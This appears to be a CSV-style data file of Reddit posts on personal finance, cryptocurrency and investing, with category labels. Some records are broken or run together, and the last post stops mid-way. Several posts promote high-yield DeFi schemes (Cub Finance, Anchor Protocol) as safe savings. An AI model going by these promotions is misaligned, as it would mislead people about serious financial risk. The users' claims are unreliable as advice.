personalfinance,Falling way behind on bills,"I am trying to find a way to pay off my high interest credit cards and one high interest loan. I have recently graduated from a technical school but have not found a higher paying job as of yet and now have a student loan to worry about paying back.
I am reaching out to see what kind of options I have as my credit score is not very high.
I have started the process of signing a contract with Elite Document Management Solutions to pay off those credit cards and loan and then I can hopefully refinance my student loan and get a better interest rate so that I won’t have a problem with paying it back. 
Has anyone ever used Elite Document Management Solutions and can you tell me if I should use them or run?! 
A couple of red flags is A) By the time I “graduate” I will have paid them around $10,000 and B) I have to let my accounts  go over 30 days without paying them before they step in but my first payment is due mid April and most of my accounts won’t be over 30 days late until May!
I need advice on this situation:( or pointed into the right direction to someone that is legit",finance
CryptoCurrency,A Guide to Getting Started with Cub Finance &amp; Earning 18% APR,"Title has a typo, currently earning 185% APR

Like many of you I'd been curious about platforms like Pancake Swap, Goose Finance and others, but was kind of overwhelmed with getting started and worried I'd lose money. I eventually got started with using Cub Finance through the Trust Wallet. Now with a lot of these Defi sites or BSC platforms you don't know if someone is going to run off with your money or if they are going to get hacked. While that is always a possibility Cub Finance is put together with the same team behind Leo Finance who has a track record of making products, growing adoption, and not stealing everyone's money. 

Cub Finance is similar to Pancake Swap and other platforms. What I liked about it as a complete beginner is I didn't have to setup the Binance Smartchain Network on MetaMask, not that it's that difficult, but it was one more thing that overwhelmed me.

I didn't want to link you guys off to a blog like I'm trying to spam traffic so there will be no screenshots here, though there's a few decent Youtube videos and/or head over to LeoFinance and there's no shortage of blog walkthroughs with screenshots.

1. Setup a TrustWallet
2. Get yourself some Binance BNB Coin
3. Send Binance BNB Coin to your Trust Wallet
4. Hit the 3 Dots on your Binance Wallet and click Swap to Smartchain
5. Now go to the ""DApps"" tab at the bottom of the screen
6. This will take you to a web browser go to CubDefi.Com
7. Go to the Menu Click Trade and swap some BNB to Cub
8. Keep some BNB to Pay fees, typically $0.40 to $0.60 cents per thing you do on BSC.
9. Click Dens, Click Approve Contract, Click ""+"" and Select how Much you want to put in the den
10. Just sit back and watch your Cub accumulate
11. If you choose you can comound and reinvest or harvest and sell it off

Now just to give a bit more background Cub Den APR was at like 3600%. As more people got on the platform its gone down. It's settled around 150% to 200%. 

You also need to be aware of the price of Cub tokens ie even if your earning huge interest if the coin tanks your losing money. When the early people who came on for high interest rates came on price tanked a bit but its back up to all time highs. There's also a Leo Bridge coming which should be pretty sweet.

Obviously there's always a risk with projects like this and platforms like this but so far it's working out well and I trust Cub Finance more so than Goose Finance and Pancake Swap.",cryptocurrency
Bitcoin,Analysis of M1 &amp; M2 Money Supply Over the Past Year and How it Relates to Bitcoin,"EDIT: The savings deposits are now counted as part of M1, which is the main reason for the giant M1 spike.

The M1 money supply and its rapid growth has been a popular topic of discussion. Let's take a look at the M1 graph and dive deeper into what it means for Bitcoin:

https://preview.redd.it/qu1f8yyyhiq61.png?width=1169&amp;format=png&amp;auto=webp&amp;s=5f4afd0208140415d70fa758a9b4fb0b84850b89

According to the Fed, the M1 Money Stock increased by \~$14.384 trillion over the last year. Therefore you may think that the total money supply increased by \~$14.384 trillion, but this is not the case. To understand this, we must first define the M0, M1, and M2 money types.

* M0 - Notes and coins in circulation (outside Federal Reserve Banks and the vaults of depository institutions) (currency)
* M1 - The M0 plus traveler's checks of non-bank issuers, demand deposits, and other checkable deposits (OCDs)
* M2 - The M1 plus savings deposits, time deposits less than $100,000, and money-market deposit accounts for individuals

We can see that by definition, the M0 Money Stock is included in the M1 Money Stock, which is in turn included in the M2 Money Stock. Let's go back to the graph, but this time we will add the M2:

https://preview.redd.it/h7q5gbw1iiq61.png?width=1169&amp;format=png&amp;auto=webp&amp;s=9c8aa8dd5ff2f77ed49142d825c5c885c3416a75

Here we see the M2 Money Stock increased by only \~$4.196 trillion over the past year. If the M1 is included in the M2, how is it possible that an increase of \~$14.384 trillion is not reflected in the M2? The answer is: Money from the savings, time, and money-market deposits in the M2 can shift into the demand and checkable deposits in the M1. The savings, time and money-market deposits are not reflected in the M1, but are reflected in the M2. Therefore, when they shift into demand and checkable deposits, it causes the M1 to increase without affecting the M2. This may indicate that large money players are moving money out of savings and into more liquid accounts. We can try to visualize this by adding it to our graph:

https://preview.redd.it/cfptsul4iiq61.png?width=969&amp;format=png&amp;auto=webp&amp;s=2a4381751121c74f1840f60f23e4b565f549b77b

Here we see new lines which I will explain. Belonging to M1 we have Total Checkable Deposits and Demand Deposits. Belonging to M2 we have Total Savings Deposits, Small Time Deposits, and Retail Money Funds. Some lines belonging to M2 should sharply turn down as the M1 Money Stock line shoots up. This would indicate money shifting. The lines for Retail Money Funds and Small Time Deposits don't appear to have caused the spike. However, when we look at the green line for Total Savings Deposits, something weird is happening. This line is labeled as DISCONTINUED and stops abruptly during the M1 spike in April 2020. I found this suspicious and started looking for the missing data. I stumbled across a YouTube video from December of 2020 with a Fed chart showing some of the missing data:

https://preview.redd.it/kp8bh02fiiq61.png?width=1920&amp;format=png&amp;auto=webp&amp;s=38aefc984ffbbc8a484923e125cf0250325ce77e

In this older chart, we see the line   for Total Savings Deposits extends all the way into December 2020 and   turns down sharply as the M1 Money Stock line shoots up. Why did the Fed   remove this data in later charts? I do not have an answer for that   question, but it does seem to explain the sudden rise in the M1 Money   Stock.

So what does this all mean   for Bitcoin? It means that just because the M1 Money Stock went up by   \~$14.384 trillion, it does not mean that the Fed printed \~$14.384   trillion. Big money players are shifting from savings accounts to more   liquid accounts. This shift could be an indication that big money no   longer trusts savings accounts or they know about future savings   regulations that we do not. This could be a flight away from USD and   into hedge assets like gold and, you guessed it, Bitcoin. I am an   amateur in macro economics. These are only my opinions and I look   forward to reading comments from more educated users.",cryptocurrency
personalfinance,"My mother got a debt notice in the mail, I'd like to ask how I might check if it is a scam.","So I'm not super good at understanding credit and banks and stuff so bear with me. We got a letter in the mail from Midland Credit Management, Inc. It says it is a Pre-Legal Notification saying she has a debt of $7,448.57. The original creditor is CAPITAL ONE, N.A. It is highly probable this is legit and she has racked up this huge debt within the past year without telling any of us, but I would like to know how to verify it.

I've asked some friends and here are the ideas we have so far:

* 1. Check to see if it is the right account number
* 2. Check if the address matches up
* 3. Call Capital One to see if this was legit

I'm not sure how to go about number 2 honestly. What address do I actually look for? I've also been told that if it was a good scam then they would put the actual address. Like none of these addresses or phone numbers I'm looking at seem to be matching up, but I don't know if I'm looking at the wrong ones or if I'm just dumb.

My mother is not home at this moment so I suppose I can't do 1 and 3 right now. I have also been told to just leave the rest of my family and let them handle it themselves, but I would like to disregard that option for now. I will try to provide any information within reason.

Edit for more info: it says the subject is Capital One Walmart Rewards, if that makes any difference.

Edit: I have been able to convince my parents to talk with me more, but I was unable to convince my mother to get a credit check but she did show me her account with Midland. I saw that she had a second debt of about $1,708. She told me this has been going on for a while now and we pays $60/month for the first debt and $100/month for the second. She also told me she could not remember why she has the debts at all nor exactly when it started.

I tried to question about the interest rate and minimum payment but she could not give me any details and I did not see any on the page. The rest of my family has been trying to assure me that the letters are just scare tactics they send every so often and that I worry too much.",finance

personalfinance,Should I pay off my truck 2.5 years early?,"Is it worth it to pay my truck off 2.5 years early with an original payoff of October 2023? Or should I keep the money in the bank? We just went from 2 incomes to 1 by choice. We have 40k in the bank, I owe $14,500 on my truck at 3.35% interest and our mortgage is about $2300/month. The $500/month I'm paying right now would certainly help what we walked away from in income and cover about 1/4 of the mortgage. Our saving account interest rate is only around 0.5% so overall I'm only saving about $800 or so in interest by paying my truck off early. We'd still have about 23k leftover after paying mortgage on 4/1 if I pay my truck off on that day

personalfinance,Discussion around receiving and completing the Florida Unemployment 1099G form.,"Hey y'all very curious as to what's going on with this situation. I would like some guidance as to how I can help people I know. It has to do with Florida, taxes, and specifically unemployment taxes in Florida. But first a quick bit of background.   


So Covid-19 basically destroyed a good chunk of the workforce, and this has hit Florida, where I'm at, very hard. I took a gap year and actually got an internship and now a job so I can save for the oncoming terror of college, lol. Anyway, I've been doing a lot of community work and trying to help give people resources I'm aware of on navigating the unemployment system in Florida. We have very low benefits, but a very high bar for getting them to help prevent fraud, and frankly keep the government from paying too much for it. DEO, the department that is responsible for UC is very jumpy on return to work holds, and some issues are an easy fix while others you may not hear back for months even if you do everything   


This leads me to my question/discussion of the day. What the heck is happening with the 1099G form?   
[https://floridajobs.org/Reemployment-Assistance-Service-Center/reemployment-assistance/claimants/tax-information](https://floridajobs.org/Reemployment-Assistance-Service-Center/reemployment-assistance/claimants/tax-information)  


Literally it seems NO ONE  can access it or find it, not within their CONNECT account, not from the post office people have tried that and never gotten a response, anything, zip zilch nothing. And DEO hasn't really released a ton of guidelines that I've seen explaining what to expect from the form, the amount that will be taxed, how it interacts with other local, state, and federal taxes. I suspect a good chunk of people will be doing their tax forms last minute, and for a lot of people, this is their very first time using this, or really any unemployment system.   


To give some more guidance as to the discussions I'd like to have upfront, I guess these are my main questions.  
What is the best method for getting this form from DEO? Any other avenues besides DEO?  
What happens if you don't get the form by the end of the tax season? Will the tax agencies start going after people who didn't get the form and didn't pay those taxes? Will the defense of ""I never got it"" be able to protect from surplus taxes?  
What should people expect from the form? I've seen the sample from the IRS but do all the same rules/deductions apply?  
How does the American Rescue Act affect all this?  


Finally, please use plain language. I'm a bit of a financial noob and in order for me to guide others or and for me to learn here, I'm gonna need to be explained without the jargon. Thank you for your time and any help you can give.",finance

At first, my accountant wrote this into my return as a taxable distribution for both federal and state, but when I pointed out this was after tax money and the contribution should be deducted, he only resolved the federal portion and not the state, therefore my total taxable income is higher for state than federal.

When I asked why I have to pay state tax on the backdoor Roth IRA conversions, he said NJ does not allow IRA deductions at the state level.

If I stay 6 months longer, I will be permanent, people at my workplace been there for 10+ years and came from the same temp agency.  Company is smaller. I make minimum wage and am located in California. Roughly if I were to continue the job for a year, I would make 22,000 dollars (I did not include taxes). I never filed taxes because it is my first year working, I am 20 years old. Worked in a printer shop but did not learn any real technical skills other than clicking the override button on the big printing press which required 2-3 men to operate. Found a post on craigslist for a free xerox machine, the big ones, has difficult problems printing before stopping. I think I can fix it and have resources like 3D printing at my disposal. Xerox machine was introduced by Xerox in 2005. I am aware of existing patents and it would not be legal to 3D print or ask oversea company to make broken part til the year 2025. I need to use the personal loan to hire movers to pick up the 220lb xerox machine which will cost 500 usd to pick it up, and bring it to my storage unit. I do not have a drivers license because of a fixed belief system \[not stated\] and ability to commute to work by bus , no suspension or criminal record. I have sisters and father who support me and can drive, but I uber places if it's urgent , otherwise I take transit bus system.

500 USD to pick up an item worth 2,000 usd at market price used. 

Need the additional 1,500 usd of the loan to purchase computer hardware. The hardware costs 600-900 usd (we are still negiotating) but worst case, 900 usd. It consists of 10 2008-2015 laptops, 5 typical PC hardware (think optiplex). Personal loan I am taking out is for legitimate business purposes. At the bank, it consists of an annual 8% interest rate for 12-36 months for a rate of between 500-5,000 usd. I only need 2,000-3,000 usd. For each thousand loan, it would cost me 32 usd in interest annually. Xerox machine I am investing in will not be used for reselling, I intend to use it for \[retracted because rules regarding business discussions\].

I(31) have no siblings, I'm unmarried, and my dad passed some years back so her plan was always to leave me her house when she retires .My dad always took care of the finances and documents so when he passed I help her will all that stuff. She's going to move back where we have tons of family, COL is low, and life is calm. At that point I'll move into my childhood home and begin renovating. I plan on living there for 10 yrs or more. 

She's not looking to make any money off the sale or pull cash out of the equity, she owes about $60K on it. When she retires next year she's going to have about $25K in savings and she'll be able to receive full social security + survivor's benefits.

* Reduce both my mom's and my tax liability ( I don't have a CPA). I care more about my mom's liability, I don't want any of this to come out of her pocket so I'll pay any taxes.
* Lock me into the historically low interest rate. I was quoted 2.95% earlier today by a lender with a credit score of 743. I haven't signed anything or provided any documents.
* I currently live in a duplex and will continue to live in it until my mom moves. She's going to continue to pay for the mortgage until she moves. It would be great if we can somehow lower the payment she's making for the next year before she moves.
* She refinanced in 2015 at an interest rate of 4.5%.
* I want to be able to pull equity out of the house in a couple years.

Questions I have:

* Do we just put me on the title and then remove her later?
* Is it better for her to sell it to me at market value or for what she owes on it?
* How will this affect both of us tax-wise?
* What is gifting equity and how does that work to our benefit in this case?
* What haven't we considered?",finance

personalfinance,HSA question from a novice,"So my work offers an HSA plan through the Local Government Federal Credit Union. My employer contributes $850 at the beginning of each year. When I go into the lgfcu website I can see the account listed, along with my checking account and such. The problem is, I see people talking about using HSA funds to invest but I don't have any options to invest my HSA money. I get a flat .45% interest rate. Can I open another HSA through  fidelity, for example, and transfer my funds and invest there? Can you have 2 HSAs open? I don't want to lose the $850 a year my employer contributes but I also would like to grow my money more than the pathetic .45%. Thanks for the help",finance
CryptoCurrency,Why most people continue to save in traditional savings account with 0.05% or less APY vs stablecoin savings in crypto with 20% APY and above?,"I don't understand why a lot are still not moving into cryptocurrency savings account using stablecoins. Most people (including 99.9% I personally know) prefer the less than 1% interest rates in their fiat savings account.

They're no coiners. They don't want Bitcoin, but they love fiat. But they don't want their fiat to have higher interest rates, in order to have more fiat, puzzles me.

I understand that they're afraid of cryptocurrency's volatility as it might go way up to 1,000,000% or drop to -99%, but we have lots of DeFi protocols now that offers stable coin savings with way higher interest rates than all the banks in the world combined. 

Anchor Protocol is one example. I think there are many out there that gives 10-20% APY on US dollars. For now, I only know UST (TerraUSD) saved in AP is giving 20-22% APY for stablecoin UST. Other USDT and USDC savings in Binance has around 5-6% APY, which is still way better than banks.

So what's stopping the crowd from getting better savings with their depreciating dollar? Pride?",cryptocurrency
personalfinance,Why use brick and mortar bank for savings?,"I just got an email from the brick and mortar credit union we have an account at (we don't keep much money here) touting their exciting tiered savings rates. The rates range from .01% for balances under 10k USD up to .35% for balances north of 500k. The online bank we use right now offers .55% for our modest balance.

My question is this: Who drops 500k plus in a savings account for an inferior interest rate....? I mean I literally don't understand who they are offering this service to, as anyone with that kind of cash laying around would be smart enough to at least pick the best rate, right? Is there some other benefit to using a brick and mortar bank other than the brick and mortar part I'm missing?",finance
Bitcoin,What happens to bitcoin if the economy collapses?,"The stock market seems to be in a giant bubble. Trillions of dollars are being helicoptered in left and right.

It just seems imminent at this point. News from Japan is now reporting the biggest short of the century as people are preparing for the collapse of the world economy. What kind of effect will this have on bitcoin? Will it stay strong, or will it tank out of pure panic? Will it drop and then quickly recover as people flood towards an asset that isn’t manipulated by government? I’m just wondering what you guys think might happen in this scenario.

financialindependence,"With mortgage interest rates so low and housing inventories so low, one of my biggest FIRE fears is locking into a spend rate that would be blown out of the water if ever had to move","I live in a HCOL area, but have the luck of having bought my home a few years ago when home prices were moderately reasonable - certainly not insanely high like they've been getting.

On top of that, I have a really low mortgage interest rate.

So great, right? I have my spending planned out, locked into very low monthly expenses for housing (relatively speaking for a HCOL area), so I'm set for my FIRE target in 5 years or so, right?

&amp;#x200B;

My only concern is that if we ever had to move (me spouse 2 young kids) to another HCOL area - even a comparable HCOL area - we'd have to pay a vastly higher monthly mortgage rate to account for both the skyrocketing listing prices of homes (even of nearly exact same size that we already live in now), and what will surely be rising interest rates.

Right now my projected annual spend in retirement is calculated based on our current relatively low monthly housing costs - I worry I'm locking myself into never being able to move unless I go hard LCOL.

Why would we ever have to move? I can't rule out that kids are still very small so may need to size up the house, and grandparents are older, so can't rule out possibility of moving closer to them (no specific reason to right now).

Why wouldn't I just move to a LCOL area? Because between grandparents *not* living in a LCOL area, and wanting to keep kids in high performing (but not pressure cooker) public school districts, that's almost always going to be a HCOL area. Hell, even if I bought a slightly larger house in my own TOWN right now, I'd probably nearly double my monthly housing costs.

How do other early retirees plan for being locked out of moving to even a similar sized home with skyrocketing housing costs?",finance

# What is Cardano?

Cardano is considered third-generation crypto and is building a proof-of-stake (PoS) blockchain network, being developed into a decentralised application (DApp) development platform with a multi-asset ledger and verifiable smart contracts. Based on peer-reviewed academic research, Cardano is working towards building a blockchain that is viable for real-world applications, by making it scalable, interoperable and sustainable.

Cardano started in 2015 with the aim of cracking all three of these challenges. Two years, thousands of GitHub commits, and hundreds of hours of study later, the first version of Cardano shipped in September 2017, and the Byron era began.

## The Eras of Cardano

* **Byron - Foundation (COMPLETE)**
   * Allowed users to buy and sell the ADA cryptocurrency.
   * Ouroboros is the first proof-of-stake protocol created on the basis of academic research, with a mathematically proven level of security.
   * The Byron era also saw the delivery of the Daedalus wallet as well as the Yoroi wallet (lighter wallet)
   * During the Byron era, the network was federated.

&amp;#x200B;

* **Shelley - Decentralisation (COMPLETE)**
   * The majority of nodes are run by network participants making Cardano more decentralised and enjoying greater security and robustness as a result.
   * Introduction of a delegation and incentives scheme.
   * A reward system to drive stake pools and community adoption.
   * The delegation and incentive scheme allows and encourages users to delegate their stake to stake pools – always-on, community-run network nodes – and be rewarded for honest participation in the network.
   * The Shelley era makes the network more useful, rewarding, and valuable for users.
   * Shelley was designed to prepare the community for a fully distributed network, a new DApp ecosystem and much more. 

&amp;#x200B;

* **Goguen - Smart contracts (UNDERWAY)**
   * Smart contracts! The Shelley era decentralised the network, the Goguen era is set to add the ability to build decentralised apps on the Cardano network.
   * Developers have been working on Goguen in tandem with Shelley. When complete, everyone, no matter their technical capabilities, or lack thereof, will be able to create and execute functional smart contracts on the Cardano network.
   * Plutus, a purpose-built smart contract development language and execution platform using the functional programming language Haskell is one of the major goals of this era. Plutus is already available for testing and allows one codebase to support both on and off-chain components.
   * [Marlowe](https://testnet.iohkdev.io/marlowe/) is a way to make Cardano accessible to a wider, less technical userbase, allowing them to create smart contracts.
   * [Marlowe Playground](https://testnet.iohkdev.io/en/marlowe/tools/marlowe-playground/) is an easy-to-use application-building platform that non-programmers can use to build financial smart contracts.
   * In short, Marlowe + Plutus = more real-world implementation. 
   * Goguen will also see the addition of a multi-currency ledger enabling users to create new natively-supported tokens.
   * This will allow the creation of fungible and non-fungible tokens, support for the creation of new cryptocurrencies on Cardano as well as the tokenisation of many types of digital and physical assets, as well as easier integration of smart contracts and DApps involving multiple cryptocurrencies.

&amp;#x200B;

* **Basho - Scaling (TO COME)**
   * This era seeks to optimise, improve the scalability and interoperability of the Cardano network.
   * Basho will see the introduction of sidechains, which are essentially new blockchains interoperable with the main Cardano chain.
   * These sidechains will extend the capabilities of the network can be used as a sharding mechanism to reduce the load on the main chain, as well as introducing experimental features without affecting the security of the main blockchain.
   * Introduction of parallel accounting styles, resulting in greater interoperability for Cardano.

&amp;#x200B;

* **Voltaire - Governance (TO COME)**
   * Having a decentralised network is only part of the work. There must be an infrastructure in place that will allow for decentralised maintenance and network improvements through stakeholders. 
   * This era will see the formation of a voting and treasury system, allowing network participants to use their stake and voting rights to influence the future development of the network.
   * The idea is to make Cardano a self-sustaining system.
   * The treasury system will fund future development of the network by using a fraction of all pooled transaction fees, which are pooled following the voting process.
   * When this happens, IOHK will have no hand in managing Cardano. It will all be in the hands of the community.

As of today, 1st April 2021, over 2,000 community pools are now responsible for 100% of block production. The more blocks made by stake pool operators, the more rewards are earned by those pools and subsequently given to users that have staked their ADA with those pools. Plutus, the platform that will host smart contracts of Cardano is set to deploy between the end of April and the beginning of May. The Alonzo testnet will allow developers to create smart contracts.",cryptocurrency

personalfinance,The checking account breakdown: Schwab vs Axos,"I'm trying to determine which checking account to open. These are thrown around as two of the better checking accounts. Here's the breakdown from the info I could get online:

# Schwab Bank (High Yield Investor Checking Account)

**Pros:**

* Free, no fees/minimum balance/etc.
* Unlimited worldwide ATM fee rebates
* Linked to free brokerage account makes investing faster/easier
* No foreign transaction fees
* Good customer service
* Great option for someone who travels internationally

Cons

* Low interest rate compared to Axos (if conditions are met)

&amp;#x200B;

# Axos (Rewards Checking)

**Pros:**

* Free, ~~no fees~~/minimum balance/etc. **EDIT:** Looking at the Axos site, they have an Essentials Checking that says ""No Fees"". The Rewards Checking account says ""No **Maintenance** Fees"". Any idea what fees this account would charge?
* Unlimited domestic ATM fee rebates (US)
* 1.25% APY (with following conditions: $1,000/mo direct deposit and 15+ debit card transactions)
* No overdraft or non-sufficient fund fees
* Great for someone who doesn't travel internationally

**Cons**

* Not so good for international travel
* Customer service seems decent, but probably not as good as Schwab
* Less established
* **EDIT:** Looks like they charge other fees, just not maintenance fees

&amp;#x200B;

For me, it seems like the determining factor is if you travel internationally or not. If you do, choose Schwab, otherwise go for the higher interest rate attainable with Axos. What do you guys think?",finance
stocks,"Found Old Stock Certificates, Are They Worthless?","My father recently gave me a couple physical stock certificates that my grandfather bought in the 70s-80s. I've tried looking up the two companies listed on the certificates in Google, the NYS Division of Corporations website, and on my brokerage app but I can't seem to locate these companies, or any company that used to be known as these two.

The companies are:

* APPLIED MANAGEMENT SCIENCES INC. (certificate issued 08/01/1989)

**EDIT:** Thanks to /u/Beholder88 
&gt; Applied Management Sciences Inc: ""Applied Management Services was acquired by Aspen Systems in 1989. The Company offered survey and data analysis as well as business process re-engineering."" Aspen systems still seems to exist, per Google, but it looks like they're a private company as I can't find anything on stock for them. You're probably out of luck there.

* DEEP SEA TECHNIQUES, INC. (cert. issued 04/12/1973)

**EDIT2:** 

Just got off the phone with Fidelity, they were very kind but ultimately had no luck in researching Deep Sea Techniques, Inc. for me. I was told to attempt to locate the ""issuer"" listed on the stock certificate, but all I see is the transfer agent Continental Stock Transfer Company (trying to find out if they are now known as Continental Stock Transfer &amp; Trust Company). 

I actually located an old prospectus for Deep Sea which listed an old name they had, as well as an address. There's nothing located at the address, but I managed to locate an SEC News Digest article about Deep Sea Techniques, Inc. offering shares of common stock for public sale by E.L. Aaron &amp; Co. 

Looking up this broker-dealer, I found a case: SEC v. Aaron regarding an appeal to a prior decision regarding a permanent injunction for violating the registration and antifraud provisions of the federal securities laws. I don't think I will get much farther with this route, going to attempt contacting the transfer agent.

~

If anyone could help me discover if these companies are out of business, and conclude that my shares are worthless, it would be much appreciated. From what I can tell, Deep Sea Techniques was incorporated in the state of New York but Applied Management Sciences was incorporated in the state of Oregon.

**EDIT3:** Thanks /u/FinalDevice for having eyes.
&gt;Note the names do not match here: ""Applied Management Sciences"" vs ""Applied Management Services"". It could be the same company and a type or a d.b.a. name, or it could be unrelated.


Confirmed through Fidelity and the transfer agent that Deep Sea Techniques, Inc. is dissolved. I'll hang on to the stock certificate and ask my father if he wants to keep it or see if a collector would buy it online.

As for Applied Management Sciences, Inc., the transfer agent listed on the stock certificate filed a notice of withdrawal as a transfer agent with the SEC, as well as their successor lol but I found the last link in the chain and will attempt to contact them tomorrow with the CUSIP.

personalfinance,Asking For A Raise &amp; How Much,"Hello all

I recently was offered a promotion (I feel I am 6-12 months over due for) and the raise was 9%. Can/should I squeeze them for more? If so how? I'm not sure what fair pay even is in my field tbh, any advice would be greatly appreciated.

I support groups outside my immediate organization to be a ""team player"", previously managed a project that is regularly briefed to higher up directors and the customer that required interfacing with many other groups, and have recently traveled on short notice to support programs that nobody else in my organization could have supported.

CryptoCurrency,Thoughts on Ledn.io (vs Celsius and BlockFi),"Hi all

I've used BlockFi for some time and recently started using Celsius as well to spread about the risk. Both of these platforms are quite popular and have active communities which is a good sign and shows they are both well trusted.

I'm looking at a third platform [Ledn.io](https://Ledn.io) which has a decent 6% interest rate on the first 2 BTC deposited, unlike the 4% at Celsius, and doesn't require a platform coin (BlockFi still offer 6% up to 1BTC). It seems a pretty simple site and they've been around for some time, but there really aren't many reviews or people using it which is concerning somewhat. I'm just wondering why this is. Is there anything in particular that people don't like about it that they chose something like Celsius that pays a lower rate? 

I understand the risks of using these platforms, so please don't post ""not your keys, not your coins"". I'm mainly interested in what it is about this platform that people don't seem to like.

In short, I'm wondering why I should keep the lower rate on Celsius when I could get better at [Ledn.io](https://Ledn.io), even without holding any platform coins, and why others also haven't done this",cryptocurrency

They did not claim me last year, but it seems now that they are trying to claim me so they can get a stimulus check for me.

personalfinance,"Any investments safe enough for money you'll need to live on in 6-12 months, or best to keep in savings?","Hi, all. Throwaway for personal details. I keep seeing comments in this sub about how idiotic it is to leave any significant amount of money in a regular savings account when you could invest it. I'm curious if that still applies when you will absolutely need the money to live on in six months to a year, and if so, what type of (low-risk, presumably low-return, but better than a savings account) investment makes sense here?

Personal context: I'm starting a one-year master's program in the fall after several years in the workforce. I've saved $21,000 for living expenses so far and am on track to hit $25,000 by the time I leave my job. It is currently sitting in what passes for a high-interest savings account these days, with an interest rate that started at 1.25% but is now 0.5%. I expect to need about $2,000 monthly between July 2020 and at least May 2021, or maybe a month or two longer if I take any time off between graduating and returning to work. But I won't need to touch most of the money for at least six months, and some of it for close to a year.

I expected the answer to be something like a six- or eight-month CD for $15,000 or so with the rest in savings for liquidity, but cursory research suggests the best-case scenario for a CD right now barely beats my savings account (most rates I saw were in the 0.4-0.5% range, and 0.7% vs. 0.5% doesn't seem worth jumping through hoops to join a local credit union in a place I've no connection to).

So does that mean I'm better off leaving it in savings after all? If I didn't specifically and unavoidably need the money to live on next spring, I'd probably just go for an index fund. But as much as I'd love to maximize my return here, I also really don't want to find myself in the spring of 2021 -- as a full-time grad student with no other income, having done my best to set myself up to be able to focus on school in a way I couldn't as a constantly-working undergrad -- unable to pay rent.",finance

personalfinance,"Balancing between Traditional, Roth, and Mega-backdoor Roth contributions","Alright so this is a bit of a complicated question and there's probably not one good answer, but figured I'd see if anyone has good insight.

I put together a spreadsheet of my current annual income and estimated expenses with precise tax calculations based on Fed/State tax tables for 2021: [Imgur Income](https://i.imgur.com/AznsIi3.png)

I'm currently saving a large portion of my income mainly because I live well below my means and don't feel the need to spend money.

The Summary is:

* 138K gross

* 47K-40K taxes depending on 401k contribution options

* ~28K expenses

* 65K-71K Assets (depending on taxes)

In the next couple of years I expect to buy a Condo and my expense obligations would go up ~18K (mid scenario) still allowing me to save ~50K/yr.

I'm 36, single (ended a 5yr in Feb), and have really been analyzing my portfolio this year (less about individual fund allocations and more overall strategy between accounts for tax purposes). In the past, I've just been doing 401K traditional, Roth IRA, and rest into individual taxable/HYSA. I'm at the point where I have too much money in non-retirement because I haven't been utilizing all my retirement account options (I didn't max my 401K or HSA in the past). 

I'm also trying to figure out how best to balance with Traditional 401K if I start doing mega-backdoor Roth. My 401K plan with Fidelity allows for after tax contributions which I started this paycheck, I also called them and they confirmed that I can do in-service withdrawals on after tax dollars and theoretically I have the ability to do mega-backdoor although the rep wouldn't advise me on the process.

**Current Assets:**

* $6K HSA

* $100K HYSA (emergency fund/down payment)

* $137K Roth IRA

* $244K Traditional 401K

* $359K taxable non-retirement

**Questions:**

1. My plan is $75K/yr in net retirement income with a retirement goal of 60-65 mainly because I don't mind working right now (so could very well have more than I need). Assuming this is 401K/pre-tax dollars that would be ~$100K gross. Because this is lower than my current gross income of ~$138K I'm trying to figure out if it makes sense to continue traditional 401K or switch to Roth 401K (or some hybrid)

2. In relation to the above, I'm really trying to minimize contributions to non-taxable at this point and ""catch-up"" for retirement accounts. This is why I started to research into mega-backdoor Roth this year. My plan is to contribute ~20K post-tax dollars automatically from my paycheck into 401k and do an annual backdoor (so will still probably have some non-retirement contributions but way lower than the past). Knowing this, does it make sense to contribute $19.5K to traditional to lower my taxes ~$6K/yr if I'm putting $26K into Roth as well (vs $46K into Roth and none into Traditional and eating taxes now).

I posted about maybe finding a fee based financial/retirement planner yesterday for questions like this but people suggested just posting here instead first.. so wondering if anyone has good advice :x

investing,Opinion: SUNW is a pump &amp; dump. Tread carefully.,"**Disclaimer:**

I understand that solar isn't something most people are enthusiastic about. However, as a decades long solar industry veteran, I see something happening, and I feel like I have a responsibility to share it.

I am not a financial advisor, or even a professional trader. I don't want anyone to make any financial moves based off of my observations, especially since many of these observations are off the cuff, and the figures can be off. However, I would like to point some things out so that people much smarter than me could perhaps do the research.

Also, if I'm wrong on this and Sunworks is as good as the recent run up would imply, please, I urge you, let me know. I'm very much open to being wrong.

**Moving on, SUNW:**

* As of 2020, they had 16 sales reps and fewer than 100 employees, according to their SEC filing.
* SUNW accumulated deficit of -$88m at the end of 2020, compared to something like -$75m 2019, meaning their deficit is increasing, despite being well beyond a reasonable period of growth, having a receding market share, and having shown little/no profit for nearly two decades.
* SUNW currently has a market cap of $450m, and was a penny stock until end of 2020.
* SUNW completed fewer than 500 installs for the year of 2020, a decline from 2019, despite 2020 being a great year for solar sales in California. This is an incredibly low number of installs for a solar company that primarily operates in a State where solar is mandatory for all new homes. While I'm aware SUNW does a few commercial projects, it doesn't make up for the baffling lack of volume, particularly when the profit margins on residential are thicker than commercial.
* SUNW does not manufacture solar panels or equipment. SUNW does not develop any proprietary hardware or software to my knowledge. They are simply a solar reseller that operates off of debt, similar to RUN and NOVA, just on a much, much smaller scale, and similarly unprofitable.
* SUNW is facing serious headwinds on possible net metering changes in California, as well as interest rates (which fund their projects) increasing.
* SUNW is also facing headwinds of increasing shipping costs, as well as limited unit availability within the U.S.
* SUNW's biggest headwind is steep competition from much bigger companies with much greater firepower (meaning ability to offer lower prices and greater volume), such as RUN, NOVA, TSLA, and SPWR. Currently SUNW offers nothing unique to give them an advantage over their competition.
* SUNW's stock price seems to be benefiting solar hype in general, but with how far they're outpacing similarly classed solar companies, and with what appears to be literally no justification, it looks unusual at best.

Just for context, their biggest competitor RUN was established in **2007**, and has about **500,000 customers**.SUNW was established in **2002**, and has somewhere between an estimated **10,000 and 20,000** customers (data unclear).

**General Opinions:**

It's my belief that SUNW's run up is either a market inefficiency, uneducated solar fomo, or simply just a pump &amp; dump. Please tread carefully. Buy it if you like it, don't if you don't.

My opinions on solar stocks, aside from SUNW: I believe the solar industry is great, especially with the average price per kwh being in a position to beat the U.S. average cost of power, and I believe there are many good solar stocks worth considering, especially with the federal tax credit having been extended last year. ENPH/SEDG are my top picks (American + Inverter suppliers). I think both SPWR and NOVA have some potential as retailers. FSLR, CSIQ, and JKS are each solid panel manufacturers, and SPRQ is a good solar financing company. If you're unfamiliar with the solar industry, the solar ETFs are a solid alternative.

My prioritization for the value of solar companies would be the following: Inverter Companies &gt; Panel manufacturers &gt; Financing Companies &gt; Large retailers &gt; Small retailers.

**Wrap up:**

